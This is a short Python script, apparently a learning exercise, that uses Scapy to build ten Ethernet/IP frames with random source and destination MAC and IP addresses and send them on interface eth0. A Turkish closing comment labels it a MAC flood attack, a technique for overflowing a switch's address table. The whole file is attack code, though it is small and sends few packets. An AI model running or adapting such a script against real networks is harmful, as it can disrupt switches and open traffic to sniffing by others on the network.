from scapy.all  import *

pckt_list = []

for i in range(10):
    srcMAC = RandMAC()
    dstMAC = RandMAC()
    srcIp = RandIP()
    dstIP = RandIP()

    ether = Ether(src=srcMAC,dst=dstMAC)
    ip = IP(src=srcIp,dst=dstIP)
    pckt =ether/ip
    pckt_list.append(pckt)
    print(srcMAC,":",srcIp,">>",dstMAC,":",dstIP)

sendp(pckt_list,iface="eth0",verbose=False)

#mac of saldırısı